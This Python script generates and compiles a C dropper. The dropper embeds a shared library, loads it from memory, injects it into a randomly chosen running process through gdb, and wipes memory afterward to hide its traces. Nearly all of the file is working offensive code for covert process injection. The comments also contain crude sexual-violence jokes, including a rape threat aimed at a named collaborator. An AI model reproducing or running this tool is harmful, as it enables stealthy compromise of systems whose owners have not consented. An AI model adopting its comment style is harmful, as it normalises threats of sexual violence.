#!/usr/bin/env python3

# humzak711 if you change my comments to be more "professional" I will r*** you mark my words
# ^ Ethan we will end up canceled mate

import sys
import os
import subprocess

def generate_source(so_path: str, output_path: str) -> None:
    # read the shared object file
    with open(so_path, 'rb') as so_file:
        so_data: bytes = so_file.read()

    # create the C source code that will have the shared object n give it a nice kiss :p
    c_code: str = f"""
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <errno.h>
#include <dirent.h>
#include <sys/types.h>
#include <sys/mman.h>
#include <unistd.h>
#include <dlfcn.h>
#include <signal.h>
#include <sys/wait.h>

// function prototype for memfd_create
int memfd_create(const char *name, unsigned int flags);

// zero out memory so no one eats it
void secure_zero(void *ptr, size_t size) {{
    volatile unsigned char *p = ptr;
    while (size--) {{
        *p++ = 0; // spam memory w so many 0s it cries and gets overwritten
    }}
}}

// embedded shared object data that got kissed goodnight
unsigned char so_data[] = {{
    {', '.join(f'0x{byte:02x}' for byte in so_data)}
}};
size_t so_data_size = sizeof(so_data); // fatness of the embedded data

// load the cute shared object from memory
void* load_embedded_so() {{
    // create a memory file descriptor
    int fd = memfd_create("embedded_so", 0);
    if (fd == -1) {{
        perror("memfd_create");
        return NULL;
    }}

    // write the embedded .so data to the memory file descriptor
    if (write(fd, so_data, so_data_size) != so_data_size) {{
        perror("write");
        close(fd);
        return NULL;
    }}

    lseek(fd, 0, SEEK_SET); // reset file offset

    // make the path to the memory file descriptor
    char path[256];
    snprintf(path, sizeof(path), "/proc/self/fd/%d", fd);

    // load the shared object
    void *handle = dlopen(path, RTLD_NOW | RTLD_GLOBAL);
    if (!handle) {{
        fprintf(stderr, "Error loading .so: %s\\n", dlerror());
        close(fd);
        return NULL;
    }}

    close(fd);
    return handle;
}}

// oh hey there reading the src, heres two kisses to keep you going xoxo

// find a suitable process to get victimised
pid_t get_injectable_pid() {{
    DIR *dir = opendir("/proc");
    if (dir == NULL) {{
        fprintf(stderr, "Error opening /proc directory: %s\\n", strerror(errno)); // fuck
        return -1;
    }}

    struct dirent *entry;
    pid_t pids[1000]; 
    int count = 0;

    // sniff through the /proc directory for valid PIDs
    while ((entry = readdir(dir)) != NULL && count < 1000) {{
        if (entry->d_type == DT_DIR) {{
            pid_t pid = atoi(entry->d_name);
            if (pid > 0 && pid != getpid() && pid != 1) {{
                char path[256];
                snprintf(path, sizeof(path), "/proc/%d/exe", pid);
                if (access(path, X_OK) == 0) {{
                    pids[count++] = pid; // snatch valid PIDs yumyum
                }}
            }}
        }}
    }}

    closedir(dir);

    // return a random PID if any were found
    if (count > 0) {{
        return pids[rand() % count];
    }}

    return -1; // no suitable victim (process) found
}}

// another kiss for you x

// inject the shared object into the target process
int inject_into_process(pid_t pid, const char *path) {{
    char command[256];
    snprintf(command, sizeof(command), "gdb -p %d -batch -ex 'call dlopen(\\"%s\\", 2)' > /dev/null 2>&1", pid, path);
    return system(command); // execute the command :o
}}

int main() {{
    // get a suitable process to inject into
    pid_t pid = get_injectable_pid();
    if (pid == -1) {{
        fprintf(stderr, "No suitable process found for injection\\n"); // :(
        return 1;
    }}

    printf("Injecting into process %d\\n", pid);

    // prep path for the shared object
    char path[256];
    snprintf(path, sizeof(path), "/proc/self/fd/%d", memfd_create("embedded_so", 0));

    // attempt injection with a maximum of 5 tries because more than 5 we cant argue it consented
    int max_attempts = 5;
    int attempt;
    for (attempt = 0; attempt < max_attempts; attempt++) {{
        // get a new PID for each attempt
        pid_t new_pid = get_injectable_pid();
        if (new_pid == -1) {{
            fprintf(stderr, "No suitable process found for injection on attempt %d\\n", attempt + 1); // she had pepper spray bro!
            return 1; // run away if no suitable victim is found
        }}

        if (inject_into_process(new_pid, path) == 0) {{
            printf("Injection succeeded.\\n"); // niceeeee, p.s another two kisses for you xx
            break; // exit on success otherwise we will be serial injectors and will break shit
        }} else {{
            printf("Injection attempt %d failed. Retrying...\\n", attempt + 1);
        }}
    }}

    // check if all victims got away
    if (attempt == max_attempts) {{
        fprintf(stderr, "All injection attempts failed. Cleaning up and exiting.\\n"); // :(
        return 1;
    }}

    // load the embedded shared object
    void *handle = load_embedded_so();
    if (!handle) {{
        fprintf(stderr, "Failed to load the embedded shared object.\\n"); // fix your fucking .so
        return 1;
    }}
    printf("Shared object loaded successfully.\\n"); // nice

    // clean up our evid.. mess.
    
    printf("Attempting to clean memory\\n");
    dlclose(handle);

    // wipe the embedded data from memory
    secure_zero(so_data, so_data_size);
    printf("Traces wiped from memory\\n");

    // exit the injected victim
    printf("All operations success, exiting\\n");
    exit(0);
}}
"""

    # write the generated C code to the output file
    with open(output_path, 'w') as output_file:
        output_file.write(c_code)

    print(f"Generated source file: {output_path}") # confirm we made the baby

# Executes file -b to determine the filetype of the file
# if it is a .so it should contain 'shared object'
# returns True if the file is a .so or else it will return False
def is_shared_object(filepath: str) -> bool:
    try:
        output: bytes = subprocess.check_output(["file", "-b", filepath], stderr=subprocess.DEVNULL)
        return b"shared object" in output
    except subprocess.CalledProcessError:
        return False
    
def main():
    # make sure the correct number of arguments are provided, learn to fucking type
    if len(sys.argv) != 3:
        print(f"Usage: {sys.argv[0]} <so_path> <output_executable>")
        sys.exit(1)

    so_path: str = sys.argv[1] # path to the shared object
    output_executable: str = sys.argv[2] # output executable name
    temp_source: str = "temp_source.c" # temp src file
    
    
    # really basic input validation for the .so file
    if not os.path.isfile(so_path):
        print(f"Error: The specified .so file does not exist: {so_path}")
        sys.exit(1)

    if is_shared_object(so_path) == False:
        print("Error: The specified file is not a shared object (.so) file.")
        sys.exit(1)

    # gen the C source code
    generate_source(so_path, temp_source)

    # compile the generated C code
    compile_cmd: str = f"gcc -o {output_executable} {temp_source} -ldl"
    result = subprocess.run(compile_cmd, shell=True, capture_output=True, text=True)
    
    # check if the compilation was successful
    if result.returncode != 0:
        print("Compilation failed:")
        print(result.stderr) # print error output
        os.unlink(temp_source) # remove temp file because who likes clutter
        sys.exit(1)

    os.unlink(temp_source) # clean up temp file
    print(f"Compiled executable: {output_executable}") # confirm successful baby making

if __name__ == "__main__":
    main() # one final bunch of kisses xoxoxoxoxo
